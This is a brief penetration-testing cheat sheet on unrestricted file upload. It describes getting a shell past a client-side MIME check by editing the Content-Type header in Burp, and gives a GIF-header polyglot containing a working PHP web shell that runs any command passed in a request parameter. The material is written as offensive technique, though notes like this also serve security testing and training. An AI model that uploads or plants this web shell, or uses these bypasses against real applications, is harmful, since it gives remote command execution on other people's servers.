# Unrestricted File Upload (UFI)

Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step.

[Unrestricted File Upload - OWASP](https://www.owasp.org/index.php/Unrestricted_File_Upload)

## Bypass MIME check - client side

With BurpProxy on, upload your shell  and then change the header to `Content-Type: image/jpeg`

## Bypass MIME check - server side

It's easy to bypass a check done with the `file` command on the server.

This file, for example, will be recognised as a proper **GIF** - but if it ends in `.php` the file will be executed.

```txt
GIF8
<?php echo system($_REQUEST['cmd']); ?>
```
